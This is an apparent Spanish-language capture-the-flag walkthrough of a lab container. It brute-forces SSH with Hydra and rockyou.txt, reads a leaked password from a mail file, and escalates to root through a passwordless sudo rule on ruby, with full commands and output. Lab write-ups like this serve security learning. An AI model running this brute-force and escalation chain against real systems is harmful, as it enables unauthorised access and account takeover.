![[Pasted image 20250514113858.png]]

Tenemos un posible usuario, vamos a lanzar un hydra a por el ssh haber si es al final un usuario del sistema

```bash
┌──(root㉿38095a406ad0)-[~]
└─# hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 10
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-14 09:40:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-14 09:40:55

```

En efecto ,ya tenemos el primer usuario del sistema, ahora vamos a ver cual es el correo que ha recibido

```bash
┌──(root㉿38095a406ad0)-[~]
└─# ssh camilo@172.17.0.3
The authenticity of host '172.17.0.3 (172.17.0.3)' cant be established.
ED25519 key fingerprint is SHA256:52z4CT20OpL7G8YfPhcdERem6Sq+z8868LngvNGXRlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
camilo@172.17.0.3s password: 
$ ls /var	
backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp  www
$ cd /var/mail
$ ls
camilo
$ file camilo	
camilo: setgid, directory
$ cd camilo	
$ ls
correo.txt
$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
$ 

```

Tenemos otra contraseña, puede ser del usuario Juan, vamos a ver si podemos entrar

```bash
┌──(root㉿38095a406ad0)-[~]
└─# ssh juan@172.17.0.3
juan@172.17.0.3s password: 
$ whoami
juan
$ sudo -l
Matching Defaults entries for juan on 9fba26ab7883:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 9fba26ab7883:
    (ALL) NOPASSWD: /usr/bin/ruby
$ 


```

Tenemos acceso a ruby como root, vamos a abrirnos una terminal como root

```bash
$ sudo -l
Matching Defaults entries for juan on 9fba26ab7883:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 9fba26ab7883:
    (ALL) NOPASSWD: /usr/bin/ruby
$ sudo /usr/bin/ruby -e "exec /bin/bash"    
-e:1: unknown regexp options - bah
$  sudo /usr/bin/ruby -e 'exec "/bin/bash"'
root@9fba26ab7883:~# whoami;id;host
root
uid=0(root) gid=0(root) groups=0(root)
bash: host: command not found
root@9fba26ab7883:~# 
```

